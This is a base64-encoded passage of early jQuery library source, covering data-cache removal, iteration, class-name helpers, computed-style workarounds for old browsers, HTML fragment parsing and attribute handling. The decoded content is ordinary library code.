HdlIHdhbnQgdG8gcmVtb3ZlIGEgc3BlY2lmaWMgc2VjdGlvbiBvZiB0aGUgZWxlbWVudCdzIGRhdGEKCQlpZiAoIG5hbWUgKSB7CgkJCWlmICggalF1ZXJ5LmNhY2hlWyBpZCBdICkgewoJCQkJLy8gUmVtb3ZlIHRoZSBzZWN0aW9uIG9mIGNhY2hlIGRhdGEKCQkJCWRlbGV0ZSBqUXVlcnkuY2FjaGVbIGlkIF1bIG5hbWUgXTsKCgkJCQkvLyBJZiB3ZSd2ZSByZW1vdmVkIGFsbCB0aGUgZGF0YSwgcmVtb3ZlIHRoZSBlbGVtZW50J3MgY2FjaGUKCQkJCW5hbWUgPSAiIjsKCgkJCQlmb3IgKCBuYW1lIGluIGpRdWVyeS5jYWNoZVsgaWQgXSApCgkJCQkJYnJlYWs7CgoJCQkJaWYgKCAhbmFtZSApCgkJCQkJalF1ZXJ5LnJlbW92ZURhdGEoIGVsZW0gKTsKCQkJfQoKCQkvLyBPdGhlcndpc2UsIHdlIHdhbnQgdG8gcmVtb3ZlIGFsbCBvZiB0aGUgZWxlbWVudCdzIGRhdGEKCQl9IGVsc2UgewoJCQkvLyBDbGVhbiB1cCB0aGUgZWxlbWVudCBleHBhbmRvCgkJCXRyeSB7CgkJCQlkZWxldGUgZWxlbVsgZXhwYW5kbyBdOwoJCQl9IGNhdGNoKGUpewoJCQkJLy8gSUUgaGFzIHRyb3VibGUgZGlyZWN0bHkgcmVtb3ZpbmcgdGhlIGV4cGFuZG8KCQkJCS8vIGJ1dCBpdCdzIG9rIHdpdGggdXNpbmcgcmVtb3ZlQXR0cmlidXRlCgkJCQlpZiAoIGVsZW0ucmVtb3ZlQXR0cmlidXRlICkKCQkJCQllbGVtLnJlbW92ZUF0dHJpYnV0ZSggZXhwYW5kbyApOwoJCQl9CgoJCQkvLyBDb21wbGV0ZWx5IHJlbW92ZSB0aGUgZGF0YSBjYWNoZQoJCQlkZWxldGUgalF1ZXJ5LmNhY2hlWyBpZCBdOwoJCX0KCX0sCgoJLy8gYXJncyBpcyBmb3IgaW50ZXJuYWwgdXNhZ2Ugb25seQoJZWFjaDogZnVuY3Rpb24oIG9iamVjdCwgY2FsbGJhY2ssIGFyZ3MgKSB7CgkJaWYgKCBhcmdzICkgewoJCQlpZiAoIG9iamVjdC5sZW5ndGggPT0gdW5kZWZpbmVkICkgewoJCQkJZm9yICggdmFyIG5hbWUgaW4gb2JqZWN0ICkKCQkJCQlpZiAoIGNhbGxiYWNrLmFwcGx5KCBvYmplY3RbIG5hbWUgXSwgYXJncyApID09PSBmYWxzZSApCgkJCQkJCWJyZWFrOwoJCQl9IGVsc2UKCQkJCWZvciAoIHZhciBpID0gMCwgbGVuZ3RoID0gb2JqZWN0Lmxlbmd0aDsgaSA8IGxlbmd0aDsgaSsrICkKCQkJCQlpZiAoIGNhbGxiYWNrLmFwcGx5KCBvYmplY3RbIGkgXSwgYXJncyApID09PSBmYWxzZSApCgkJCQkJCWJyZWFrOwoKCQkvLyBBIHNwZWNpYWwsIGZhc3QsIGNhc2UgZm9yIHRoZSBtb3N0IGNvbW1vbiB1c2Ugb2YgZWFjaAoJCX0gZWxzZSB7CgkJCWlmICggb2JqZWN0Lmxlbmd0aCA9PSB1bmRlZmluZWQgKSB7CgkJCQlmb3IgKCB2YXIgbmFtZSBpbiBvYmplY3QgKQoJCQkJCWlmICggY2FsbGJhY2suY2FsbCggb2JqZWN0WyBuYW1lIF0sIG5hbWUsIG9iamVjdFsgbmFtZSBdICkgPT09IGZhbHNlICkKCQkJCQkJYnJlYWs7CgkJCX0gZWxzZQoJCQkJZm9yICggdmFyIGkgPSAwLCBsZW5ndGggPSBvYmplY3QubGVuZ3RoLCB2YWx1ZSA9IG9iamVjdFswXTsgCgkJCQkJaSA8IGxlbmd0aCAmJiBjYWxsYmFjay5jYWxsKCB2YWx1ZSwgaSwgdmFsdWUgKSAhPT0gZmFsc2U7IHZhbHVlID0gb2JqZWN0WysraV0gKXt9CgkJfQoKCQlyZXR1cm4gb2JqZWN0OwoJfSwKCQoJcHJvcDogZnVuY3Rpb24oIGVsZW0sIHZhbHVlLCB0eXBlLCBpLCBuYW1lICkgewoJCQkvLyBIYW5kbGUgZXhlY3V0YWJsZSBmdW5jdGlvbnMKCQkJaWYgKCBqUXVlcnkuaXNGdW5jdGlvbiggdmFsdWUgKSApCgkJCQl2YWx1ZSA9IHZhbHVlLmNhbGwoIGVsZW0sIGkgKTsKCQkJCQoJCQkvLyBIYW5kbGUgcGFzc2luZyBpbiBhIG51bWJlciB0byBhIENTUyBwcm9wZXJ0eQoJCQlyZXR1cm4gdmFsdWUgJiYgdmFsdWUuY29uc3RydWN0b3IgPT0gTnVtYmVyICYmIHR5cGUgPT0gImN1ckNTUyIgJiYgIWV4Y2x1ZGUudGVzdCggbmFtZSApID8KCQkJCXZhbHVlICsgInB4IiA6CgkJCQl2YWx1ZTsKCX0sCgoJY2xhc3NOYW1lOiB7CgkJLy8gaW50ZXJuYWwgb25seSwgdXNlIGFkZENsYXNzKCJjbGFzcyIpCgkJYWRkOiBmdW5jdGlvbiggZWxlbSwgY2xhc3NOYW1lcyApIHsKCQkJalF1ZXJ5LmVhY2goKGNsYXNzTmFtZXMgfHwgIiIpLnNwbGl0KC9ccysvKSwgZnVuY3Rpb24oaSwgY2xhc3NOYW1lKXsKCQkJCWlmICggZWxlbS5ub2RlVHlwZSA9PSAxICYmICFqUXVlcnkuY2xhc3NOYW1lLmhhcyggZWxlbS5jbGFzc05hbWUsIGNsYXNzTmFtZSApICkKCQkJCQllbGVtLmNsYXNzTmFtZSArPSAoZWxlbS5jbGFzc05hbWUgPyAiICIgOiAiIikgKyBjbGFzc05hbWU7CgkJCX0pOwoJCX0sCgoJCS8vIGludGVybmFsIG9ubHksIHVzZSByZW1vdmVDbGFzcygiY2xhc3MiKQoJCXJlbW92ZTogZnVuY3Rpb24oIGVsZW0sIGNsYXNzTmFtZXMgKSB7CgkJCWlmIChlbGVtLm5vZGVUeXBlID09IDEpCgkJCQllbGVtLmNsYXNzTmFtZSA9IGNsYXNzTmFtZXMgIT0gdW5kZWZpbmVkID8KCQkJCQlqUXVlcnkuZ3JlcChlbGVtLmNsYXNzTmFtZS5zcGxpdCgvXHMrLyksIGZ1bmN0aW9uKGNsYXNzTmFtZSl7CgkJCQkJCXJldHVybiAhalF1ZXJ5LmNsYXNzTmFtZS5oYXMoIGNsYXNzTmFtZXMsIGNsYXNzTmFtZSApOwkKCQkJCQl9KS5qb2luKCIgIikgOgoJCQkJCSIiOwoJCX0sCgoJCS8vIGludGVybmFsIG9ubHksIHVzZSBpcygiLmNsYXNzIikKCQloYXM6IGZ1bmN0aW9uKCBlbGVtLCBjbGFzc05hbWUgKSB7CgkJCXJldHVybiBqUXVlcnkuaW5BcnJheSggY2xhc3NOYW1lLCAoZWxlbS5jbGFzc05hbWUgfHwgZWxlbSkudG9TdHJpbmcoKS5zcGxpdCgvXHMrLykgKSA+IC0xOwoJCX0KCX0sCgoJLy8gQSBtZXRob2QgZm9yIHF1aWNrbHkgc3dhcHBpbmcgaW4vb3V0IENTUyBwcm9wZXJ0aWVzIHRvIGdldCBjb3JyZWN0IGNhbGN1bGF0aW9ucwoJc3dhcDogZnVuY3Rpb24oIGVsZW0sIG9wdGlvbnMsIGNhbGxiYWNrICkgewoJCXZhciBvbGQgPSB7fTsKCQkvLyBSZW1lbWJlciB0aGUgb2xkIHZhbHVlcywgYW5kIGluc2VydCB0aGUgbmV3IG9uZXMKCQlmb3IgKCB2YXIgbmFtZSBpbiBvcHRpb25zICkgewoJCQlvbGRbIG5hbWUgXSA9IGVsZW0uc3R5bGVbIG5hbWUgXTsKCQkJZWxlbS5zdHlsZVsgbmFtZSBdID0gb3B0aW9uc1sgbmFtZSBdOwoJCX0KCgkJY2FsbGJhY2suY2FsbCggZWxlbSApOwoKCQkvLyBSZXZlcnQgdGhlIG9sZCB2YWx1ZXMKCQlmb3IgKCB2YXIgbmFtZSBpbiBvcHRpb25zICkKCQkJZWxlbS5zdHlsZVsgbmFtZSBdID0gb2xkWyBuYW1lIF07Cgl9LAoKCWNzczogZnVuY3Rpb24oIGVsZW0sIG5hbWUsIGZvcmNlICkgewoJCWlmICggbmFtZSA9PSAid2lkdGgiIHx8IG5hbWUgPT0gImhlaWdodCIgKSB7CgkJCXZhciB2YWwsIHByb3BzID0geyBwb3NpdGlvbjogImFic29sdXRlIiwgdmlzaWJpbGl0eTogImhpZGRlbiIsIGRpc3BsYXk6ImJsb2NrIiB9LCB3aGljaCA9IG5hbWUgPT0gIndpZHRoIiA/IFsgIkxlZnQiLCAiUmlnaHQiIF0gOiBbICJUb3AiLCAiQm90dG9tIiBdOwoJCQoJCQlmdW5jdGlvbiBnZXRXSCgpIHsKCQkJCXZhbCA9IG5hbWUgPT0gIndpZHRoIiA/IGVsZW0ub2Zmc2V0V2lkdGggOiBlbGVtLm9mZnNldEhlaWdodDsKCQkJCXZhciBwYWRkaW5nID0gMCwgYm9yZGVyID0gMDsKCQkJCWpRdWVyeS5lYWNoKCB3aGljaCwgZnVuY3Rpb24oKSB7CgkJCQkJcGFkZGluZyArPSBwYXJzZUZsb2F0KGpRdWVyeS5jdXJDU1MoIGVsZW0sICJwYWRkaW5nIiArIHRoaXMsIHRydWUpKSB8fCAwOwoJCQkJCWJvcmRlciArPSBwYXJzZUZsb2F0KGpRdWVyeS5jdXJDU1MoIGVsZW0sICJib3JkZXIiICsgdGhpcyArICJXaWR0aCIsIHRydWUpKSB8fCAwOwoJCQkJfSk7CgkJCQl2YWwgLT0gTWF0aC5yb3VuZChwYWRkaW5nICsgYm9yZGVyKTsKCQkJfQoJCQoJCQlpZiAoIGpRdWVyeShlbGVtKS5pcygiOnZpc2libGUiKSApCgkJCQlnZXRXSCgpOwoJCQllbHNlCgkJCQlqUXVlcnkuc3dhcCggZWxlbSwgcHJvcHMsIGdldFdIICk7CgkJCQoJCQlyZXR1cm4gTWF0aC5tYXgoMCwgdmFsKTsKCQl9CgkJCgkJcmV0dXJuIGpRdWVyeS5jdXJDU1MoIGVsZW0sIG5hbWUsIGZvcmNlICk7Cgl9LAoKCWN1ckNTUzogZnVuY3Rpb24oIGVsZW0sIG5hbWUsIGZvcmNlICkgewoJCXZhciByZXQ7CgoJCS8vIEEgaGVscGVyIG1ldGhvZCBmb3IgZGV0ZXJtaW5pbmcgaWYgYW4gZWxlbWVudCdzIHZhbHVlcyBhcmUgYnJva2VuCgkJZnVuY3Rpb24gY29sb3IoIGVsZW0gKSB7CgkJCWlmICggIWpRdWVyeS5icm93c2VyLnNhZmFyaSApCgkJCQlyZXR1cm4gZmFsc2U7CgoJCQl2YXIgcmV0ID0gZG9jdW1lbnQuZGVmYXVsdFZpZXcuZ2V0Q29tcHV0ZWRTdHlsZSggZWxlbSwgbnVsbCApOwoJCQlyZXR1cm4gIXJldCB8fCByZXQuZ2V0UHJvcGVydHlWYWx1ZSgiY29sb3IiKSA9PSAiIjsKCQl9CgoJCS8vIFdlIG5lZWQgdG8gaGFuZGxlIG9wYWNpdHkgc3BlY2lhbCBpbiBJRQoJCWlmICggbmFtZSA9PSAib3BhY2l0eSIgJiYgalF1ZXJ5LmJyb3dzZXIubXNpZSApIHsKCQkJcmV0ID0galF1ZXJ5LmF0dHIoIGVsZW0uc3R5bGUsICJvcGFjaXR5IiApOwoKCQkJcmV0dXJuIHJldCA9PSAiIiA/CgkJCQkiMSIgOgoJCQkJcmV0OwoJCX0KCQkvLyBPcGVyYSBzb21ldGltZXMgd2lsbCBnaXZlIHRoZSB3cm9uZyBkaXNwbGF5IGFuc3dlciwgdGhpcyBmaXhlcyBpdCwgc2VlICMyMDM3CgkJaWYgKCBqUXVlcnkuYnJvd3Nlci5vcGVyYSAmJiBuYW1lID09ICJkaXNwbGF5IiApIHsKCQkJdmFyIHNhdmUgPSBlbGVtLnN0eWxlLmRpc3BsYXk7CgkJCWVsZW0uc3R5bGUuZGlzcGxheSA9ICJibG9jayI7CgkJCWVsZW0uc3R5bGUuZGlzcGxheSA9IHNhdmU7CgkJfQoJCQoJCS8vIE1ha2Ugc3VyZSB3ZSdyZSB1c2luZyB0aGUgcmlnaHQgbmFtZSBmb3IgZ2V0dGluZyB0aGUgZmxvYXQgdmFsdWUKCQlpZiAoIG5hbWUubWF0Y2goIC9mbG9hdC9pICkgKQoJCQluYW1lID0gc3R5bGVGbG9hdDsKCgkJaWYgKCAhZm9yY2UgJiYgZWxlbS5zdHlsZSAmJiBlbGVtLnN0eWxlWyBuYW1lIF0gKQoJCQlyZXQgPSBlbGVtLnN0eWxlWyBuYW1lIF07CgoJCWVsc2UgaWYgKCBkb2N1bWVudC5kZWZhdWx0VmlldyAmJiBkb2N1bWVudC5kZWZhdWx0Vmlldy5nZXRDb21wdXRlZFN0eWxlICkgewoKCQkJLy8gT25seSAiZmxvYXQiIGlzIG5lZWRlZCBoZXJlCgkJCWlmICggbmFtZS5tYXRjaCggL2Zsb2F0L2kgKSApCgkJCQluYW1lID0gImZsb2F0IjsKCgkJCW5hbWUgPSBuYW1lLnJlcGxhY2UoIC8oW0EtWl0pL2csICItJDEiICkudG9Mb3dlckNhc2UoKTsKCgkJCXZhciBnZXRDb21wdXRlZFN0eWxlID0gZG9jdW1lbnQuZGVmYXVsdFZpZXcuZ2V0Q29tcHV0ZWRTdHlsZSggZWxlbSwgbnVsbCApOwoKCQkJaWYgKCBnZXRDb21wdXRlZFN0eWxlICYmICFjb2xvciggZWxlbSApICkKCQkJCXJldCA9IGdldENvbXB1dGVkU3R5bGUuZ2V0UHJvcGVydHlWYWx1ZSggbmFtZSApOwoKCQkJLy8gSWYgdGhlIGVsZW1lbnQgaXNuJ3QgcmVwb3J0aW5nIGl0cyB2YWx1ZXMgcHJvcGVybHkgaW4gU2FmYXJpCgkJCS8vIHRoZW4gc29tZSBkaXNwbGF5OiBub25lIGVsZW1lbnRzIGFyZSBpbnZvbHZlZAoJCQllbHNlIHsKCQkJCXZhciBzd2FwID0gW10sIHN0YWNrID0gW107CgoJCQkJLy8gTG9jYXRlIGFsbCBvZiB0aGUgcGFyZW50IGRpc3BsYXk6IG5vbmUgZWxlbWVudHMKCQkJCWZvciAoIHZhciBhID0gZWxlbTsgYSAmJiBjb2xvcihhKTsgYSA9IGEucGFyZW50Tm9kZSApCgkJCQkJc3RhY2sudW5zaGlmdChhKTsKCgkJCQkvLyBHbyB0aHJvdWdoIGFuZCBtYWtlIHRoZW0gdmlzaWJsZSwgYnV0IGluIHJldmVyc2UKCQkJCS8vIChJdCB3b3VsZCBiZSBiZXR0ZXIgaWYgd2Uga25ldyB0aGUgZXhhY3QgZGlzcGxheSB0eXBlIHRoYXQgdGhleSBoYWQpCgkJCQlmb3IgKCB2YXIgaSA9IDA7IGkgPCBzdGFjay5sZW5ndGg7IGkrKyApCgkJCQkJaWYgKCBjb2xvciggc3RhY2tbIGkgXSApICkgewoJCQkJCQlzd2FwWyBpIF0gPSBzdGFja1sgaSBdLnN0eWxlLmRpc3BsYXk7CgkJCQkJCXN0YWNrWyBpIF0uc3R5bGUuZGlzcGxheSA9ICJibG9jayI7CgkJCQkJfQoKCQkJCS8vIFNpbmNlIHdlIGZsaXAgdGhlIGRpc3BsYXkgc3R5bGUsIHdlIGhhdmUgdG8gaGFuZGxlIHRoYXQKCQkJCS8vIG9uZSBzcGVjaWFsLCBvdGhlcndpc2UgZ2V0IHRoZSB2YWx1ZQoJCQkJcmV0ID0gbmFtZSA9PSAiZGlzcGxheSIgJiYgc3dhcFsgc3RhY2subGVuZ3RoIC0gMSBdICE9IG51bGwgPwoJCQkJCSJub25lIiA6CgkJCQkJKCBnZXRDb21wdXRlZFN0eWxlICYmIGdldENvbXB1dGVkU3R5bGUuZ2V0UHJvcGVydHlWYWx1ZSggbmFtZSApICkgfHwgIiI7CgoJCQkJLy8gRmluYWxseSwgcmV2ZXJ0IHRoZSBkaXNwbGF5IHN0eWxlcyBiYWNrCgkJCQlmb3IgKCB2YXIgaSA9IDA7IGkgPCBzd2FwLmxlbmd0aDsgaSsrICkKCQkJCQlpZiAoIHN3YXBbIGkgXSAhPSBudWxsICkKCQkJCQkJc3RhY2tbIGkgXS5zdHlsZS5kaXNwbGF5ID0gc3dhcFsgaSBdOwoJCQl9CgoJCQkvLyBXZSBzaG91bGQgYWx3YXlzIGdldCBhIG51bWJlciBiYWNrIGZyb20gb3BhY2l0eQoJCQlpZiAoIG5hbWUgPT0gIm9wYWNpdHkiICYmIHJldCA9PSAiIiApCgkJCQlyZXQgPSAiMSI7CgoJCX0gZWxzZSBpZiAoIGVsZW0uY3VycmVudFN0eWxlICkgewoJCQl2YXIgY2FtZWxDYXNlID0gbmFtZS5yZXBsYWNlKC9cLShcdykvZywgZnVuY3Rpb24oYWxsLCBsZXR0ZXIpewoJCQkJcmV0dXJuIGxldHRlci50b1VwcGVyQ2FzZSgpOwoJCQl9KTsKCgkJCXJldCA9IGVsZW0uY3VycmVudFN0eWxlWyBuYW1lIF0gfHwgZWxlbS5jdXJyZW50U3R5bGVbIGNhbWVsQ2FzZSBdOwoKCQkJLy8gRnJvbSB0aGUgYXdlc29tZSBoYWNrIGJ5IERlYW4gRWR3YXJkcwoJCQkvLyBodHRwOi8vZXJpay5lYWUubmV0L2FyY2hpdmVzLzIwMDcvMDcvMjcvMTguNTQuMTUvI2NvbW1lbnQtMTAyMjkxCgoJCQkvLyBJZiB3ZSdyZSBub3QgZGVhbGluZyB3aXRoIGEgcmVndWxhciBwaXhlbCBudW1iZXIKCQkJLy8gYnV0IGEgbnVtYmVyIHRoYXQgaGFzIGEgd2VpcmQgZW5kaW5nLCB3ZSBuZWVkIHRvIGNvbnZlcnQgaXQgdG8gcGl4ZWxzCgkJCWlmICggIS9eXGQrKHB4KT8kL2kudGVzdCggcmV0ICkgJiYgL15cZC8udGVzdCggcmV0ICkgKSB7CgkJCQkvLyBSZW1lbWJlciB0aGUgb3JpZ2luYWwgdmFsdWVzCgkJCQl2YXIgc3R5bGUgPSBlbGVtLnN0eWxlLmxlZnQsIHJ1bnRpbWVTdHlsZSA9IGVsZW0ucnVudGltZVN0eWxlLmxlZnQ7CgoJCQkJLy8gUHV0IGluIHRoZSBuZXcgdmFsdWVzIHRvIGdldCBhIGNvbXB1dGVkIHZhbHVlIG91dAoJCQkJZWxlbS5ydW50aW1lU3R5bGUubGVmdCA9IGVsZW0uY3VycmVudFN0eWxlLmxlZnQ7CgkJCQllbGVtLnN0eWxlLmxlZnQgPSByZXQgfHwgMDsKCQkJCXJldCA9IGVsZW0uc3R5bGUucGl4ZWxMZWZ0ICsgInB4IjsKCgkJCQkvLyBSZXZlcnQgdGhlIGNoYW5nZWQgdmFsdWVzCgkJCQllbGVtLnN0eWxlLmxlZnQgPSBzdHlsZTsKCQkJCWVsZW0ucnVudGltZVN0eWxlLmxlZnQgPSBydW50aW1lU3R5bGU7CgkJCX0KCQl9CgoJCXJldHVybiByZXQ7Cgl9LAoJCgljbGVhbjogZnVuY3Rpb24oIGVsZW1zLCBjb250ZXh0ICkgewoJCXZhciByZXQgPSBbXTsKCQljb250ZXh0ID0gY29udGV4dCB8fCBkb2N1bWVudDsKCQkvLyAhY29udGV4dC5jcmVhdGVFbGVtZW50IGZhaWxzIGluIElFIHdpdGggYW4gZXJyb3IgYnV0IHJldHVybnMgdHlwZW9mICdvYmplY3QnCgkJaWYgKHR5cGVvZiBjb250ZXh0LmNyZWF0ZUVsZW1lbnQgPT0gJ3VuZGVmaW5lZCcpIAoJCQljb250ZXh0ID0gY29udGV4dC5vd25lckRvY3VtZW50IHx8IGNvbnRleHRbMF0gJiYgY29udGV4dFswXS5vd25lckRvY3VtZW50IHx8IGRvY3VtZW50OwoKCQlqUXVlcnkuZWFjaChlbGVtcywgZnVuY3Rpb24oaSwgZWxlbSl7CgkJCWlmICggIWVsZW0gKQoJCQkJcmV0dXJuOwoKCQkJaWYgKCBlbGVtLmNvbnN0cnVjdG9yID09IE51bWJlciApCgkJCQllbGVtID0gZWxlbS50b1N0cmluZygpOwoJCQkKCQkJLy8gQ29udmVydCBodG1sIHN0cmluZyBpbnRvIERPTSBub2RlcwoJCQlpZiAoIHR5cGVvZiBlbGVtID09ICJzdHJpbmciICkgewoJCQkJLy8gRml4ICJYSFRNTCItc3R5bGUgdGFncyBpbiBhbGwgYnJvd3NlcnMKCQkJCWVsZW0gPSBlbGVtLnJlcGxhY2UoLyg8KFx3KylbXj5dKj8pXC8+L2csIGZ1bmN0aW9uKGFsbCwgZnJvbnQsIHRhZyl7CgkJCQkJcmV0dXJuIHRhZy5tYXRjaCgvXihhYmJyfGJyfGNvbHxpbWd8aW5wdXR8bGlua3xtZXRhfHBhcmFtfGhyfGFyZWF8ZW1iZWQpJC9pKSA/CgkJCQkJCWFsbCA6CgkJCQkJCWZyb250ICsgIj48LyIgKyB0YWcgKyAiPiI7CgkJCQl9KTsKCgkJCQkvLyBUcmltIHdoaXRlc3BhY2UsIG90aGVyd2lzZSBpbmRleE9mIHdvbid0IHdvcmsgYXMgZXhwZWN0ZWQKCQkJCXZhciB0YWdzID0galF1ZXJ5LnRyaW0oIGVsZW0gKS50b0xvd2VyQ2FzZSgpLCBkaXYgPSBjb250ZXh0LmNyZWF0ZUVsZW1lbnQoImRpdiIpOwoKCQkJCXZhciB3cmFwID0KCQkJCQkvLyBvcHRpb24gb3Igb3B0Z3JvdXAKCQkJCQkhdGFncy5pbmRleE9mKCI8b3B0IikgJiYKCQkJCQlbIDEsICI8c2VsZWN0IG11bHRpcGxlPSdtdWx0aXBsZSc+IiwgIjwvc2VsZWN0PiIgXSB8fAoJCQkJCQoJCQkJCSF0YWdzLmluZGV4T2YoIjxsZWciKSAmJgoJCQkJCVsgMSwgIjxmaWVsZHNldD4iLCAiPC9maWVsZHNldD4iIF0gfHwKCQkJCQkKCQkJCQl0YWdzLm1hdGNoKC9ePCh0aGVhZHx0Ym9keXx0Zm9vdHxjb2xnfGNhcCkvKSAmJgoJCQkJCVsgMSwgIjx0YWJsZT4iLCAiPC90YWJsZT4iIF0gfHwKCQkJCQkKCQkJCQkhdGFncy5pbmRleE9mKCI8dHIiKSAmJgoJCQkJCVsgMiwgIjx0YWJsZT48dGJvZHk+IiwgIjwvdGJvZHk+PC90YWJsZT4iIF0gfHwKCQkJCQkKCQkJCSAJLy8gPHRoZWFkPiBtYXRjaGVkIGFib3ZlCgkJCQkJKCF0YWdzLmluZGV4T2YoIjx0ZCIpIHx8ICF0YWdzLmluZGV4T2YoIjx0aCIpKSAmJgoJCQkJCVsgMywgIjx0YWJsZT48dGJvZHk+PHRyPiIsICI8L3RyPjwvdGJvZHk+PC90YWJsZT4iIF0gfHwKCQkJCQkKCQkJCQkhdGFncy5pbmRleE9mKCI8Y29sIikgJiYKCQkJCQlbIDIsICI8dGFibGU+PHRib2R5PjwvdGJvZHk+PGNvbGdyb3VwPiIsICI8L2NvbGdyb3VwPjwvdGFibGU+IiBdIHx8CgoJCQkJCS8vIElFIGNhbid0IHNlcmlhbGl6ZSA8bGluaz4gYW5kIDxzY3JpcHQ+IHRhZ3Mgbm9ybWFsbHkKCQkJCQlqUXVlcnkuYnJvd3Nlci5tc2llICYmCgkJCQkJWyAxLCAiZGl2PGRpdj4iLCAiPC9kaXY+IiBdIHx8CgkJCQkJCgkJCQkJWyAwLCAiIiwgIiIgXTsKCgkJCQkvLyBHbyB0byBodG1sIGFuZCBiYWNrLCB0aGVuIHBlZWwgb2ZmIGV4dHJhIHdyYXBwZXJzCgkJCQlkaXYuaW5uZXJIVE1MID0gd3JhcFsxXSArIGVsZW0gKyB3cmFwWzJdOwoJCQkJCgkJCQkvLyBNb3ZlIHRvIHRoZSByaWdodCBkZXB0aAoJCQkJd2hpbGUgKCB3cmFwWzBdLS0gKQoJCQkJCWRpdiA9IGRpdi5sYXN0Q2hpbGQ7CgkJCQkKCQkJCS8vIFJlbW92ZSBJRSdzIGF1dG9pbnNlcnRlZCA8dGJvZHk+IGZyb20gdGFibGUgZnJhZ21lbnRzCgkJCQlpZiAoIGpRdWVyeS5icm93c2VyLm1zaWUgKSB7CgkJCQkJCgkJCQkJLy8gU3RyaW5nIHdhcyBhIDx0YWJsZT4sICptYXkqIGhhdmUgc3B1cmlvdXMgPHRib2R5PgoJCQkJCXZhciB0Ym9keSA9ICF0YWdzLmluZGV4T2YoIjx0YWJsZSIpICYmIHRhZ3MuaW5kZXhPZigiPHRib2R5IikgPCAwID8KCQkJCQkJZGl2LmZpcnN0Q2hpbGQgJiYgZGl2LmZpcnN0Q2hpbGQuY2hpbGROb2RlcyA6CgkJCQkJCQoJCQkJCQkvLyBTdHJpbmcgd2FzIGEgYmFyZSA8dGhlYWQ+IG9yIDx0Zm9vdD4KCQkJCQkJd3JhcFsxXSA9PSAiPHRhYmxlPiIgJiYgdGFncy5pbmRleE9mKCI8dGJvZHkiKSA8IDAgPwoJCQkJCQkJZGl2LmNoaWxkTm9kZXMgOgoJCQkJCQkJW107CgkJCQkKCQkJCQlmb3IgKCB2YXIgaiA9IHRib2R5Lmxlbmd0aCAtIDE7IGogPj0gMCA7IC0taiApCgkJCQkJCWlmICggalF1ZXJ5Lm5vZGVOYW1lKCB0Ym9keVsgaiBdLCAidGJvZHkiICkgJiYgIXRib2R5WyBqIF0uY2hpbGROb2Rlcy5sZW5ndGggKQoJCQkJCQkJdGJvZHlbIGogXS5wYXJlbnROb2RlLnJlbW92ZUNoaWxkKCB0Ym9keVsgaiBdICk7CgkJCQkJCgkJCQkJLy8gSUUgY29tcGxldGVseSBraWxscyBsZWFkaW5nIHdoaXRlc3BhY2Ugd2hlbiBpbm5lckhUTUwgaXMgdXNlZAkKCQkJCQlpZiAoIC9eXHMvLnRlc3QoIGVsZW0gKSApCQoJCQkJCQlkaXYuaW5zZXJ0QmVmb3JlKCBjb250ZXh0LmNyZWF0ZVRleHROb2RlKCBlbGVtLm1hdGNoKC9eXHMqLylbMF0gKSwgZGl2LmZpcnN0Q2hpbGQgKTsKCQkJCQoJCQkJfQoJCQkJCgkJCQllbGVtID0galF1ZXJ5Lm1ha2VBcnJheSggZGl2LmNoaWxkTm9kZXMgKTsKCQkJfQoKCQkJaWYgKCBlbGVtLmxlbmd0aCA9PT0gMCAmJiAoIWpRdWVyeS5ub2RlTmFtZSggZWxlbSwgImZvcm0iICkgJiYgIWpRdWVyeS5ub2RlTmFtZSggZWxlbSwgInNlbGVjdCIgKSkgKQoJCQkJcmV0dXJuOwoKCQkJaWYgKCBlbGVtWzBdID09IHVuZGVmaW5lZCB8fCBqUXVlcnkubm9kZU5hbWUoIGVsZW0sICJmb3JtIiApIHx8IGVsZW0ub3B0aW9ucyApCgkJCQlyZXQucHVzaCggZWxlbSApOwoKCQkJZWxzZQoJCQkJcmV0ID0galF1ZXJ5Lm1lcmdlKCByZXQsIGVsZW0gKTsKCgkJfSk7CgoJCXJldHVybiByZXQ7Cgl9LAoJCglhdHRyOiBmdW5jdGlvbiggZWxlbSwgbmFtZSwgdmFsdWUgKSB7CgkJLy8gZG9uJ3Qgc2V0IGF0dHJpYnV0ZXMgb24gdGV4dCBhbmQgY29tbWVudCBub2RlcwoJCWlmICghZWxlbSB8fCBlbGVtLm5vZGVUeXBlID09IDMgfHwgZWxlbS5ub2RlVHlwZSA9PSA4KQoJCQlyZXR1cm4gdW5kZWZpbmVkOwoKCQl2YXIgZml4ID0galF1ZXJ5LmlzWE1MRG9jKCBlbGVtICkgPwoJCQl7fSA6CgkJCWpRdWVyeS5wcm9wczsKCgkJLy8gU2FmYXJpIG1pcy1yZXBvcnRzIHRoZSBkZWZhdWx0IHNlbGVjdGVkIHByb3BlcnR5IG9mIGEgaGlkZGVuIG9wdGlvbgoJCS8vIEFjY2Vzc2luZyB0aGUgcGFyZW50J3Mgc2VsZWN0ZWRJbmRleCBwcm9wZXJ0eSBmaXhlcyBpdAoJCWlmICggbmFtZSA9PSAic2VsZWN0ZWQiICYmIGpRdWVyeS5icm93c2VyLnNhZmFyaSApCgkJCWVsZW0ucGFyZW50Tm9kZS5zZWxlY3RlZEluZGV4OwoJCQoJCS8vIENlcnRhaW4gYXR0cmlidXRlcyBvbmx5IHdvcmsgd2hlbiBhY2Nlc3NlZCB2aWEgdGhlIG9sZCBET00gMCB3YXkKCQlpZiAoIGZpeFsgbmFtZSBdICkgewoJCQlpZiAoIHZhbHVlICE9IHVuZGVmaW5lZCApCgkJCQllbGVtWyBmaXhbIG5hbWUgXSBdID0gdmFsdWU7CgoJCQlyZXR1cm4gZWxlbVsgZml4WyBuYW1lIF0gXTsKCgkJfSBlbHNlIGlmICggalF1ZXJ5LmJyb3dzZXIubXNpZSAmJiBuYW1lID09ICJzdHlsZSIgKQoJCQlyZXR1cm4galF1ZXJ5LmF0dHIoIGVsZW0uc3R5bGUsICJjc3NUZXh0IiwgdmFsdWUgKTsKCgkJZWxzZSBpZiAoIHZhbHVlID09IHVuZGVmaW5lZCAmJiBqUXVlcnkuYnJvd3Nlci5tc2llICYmIGpRdWVyeS5ub2RlTmFtZSggZWxlbSwgImZvcm0iICkgJiYgKG5hbWUgPT0gImFjdGlvbiIgfHwgbmFtZSA9PSAibWV0aG9kIikgKQoJCQlyZXR1cm4gZWxlbS5nZXRBdHRyaWJ1dGVOb2RlKCBuYW1lICkubm9kZVZhbHVlOwoKCQkvLyBJRSBlbGVtLmdldEF0dHJpYnV0ZSBwYXNzZXMgZXZlbiBmb3Igc3R5bGUKCQllbHNlIGlmICggZWxlbS50YWdOYW1lICkgewoKCQkJaWYgKCB2YWx1ZSAhPSB1bmRlZmluZWQgKSB7CgkJCQkvLyBXZSBjYW4ndCBhbGxvdyB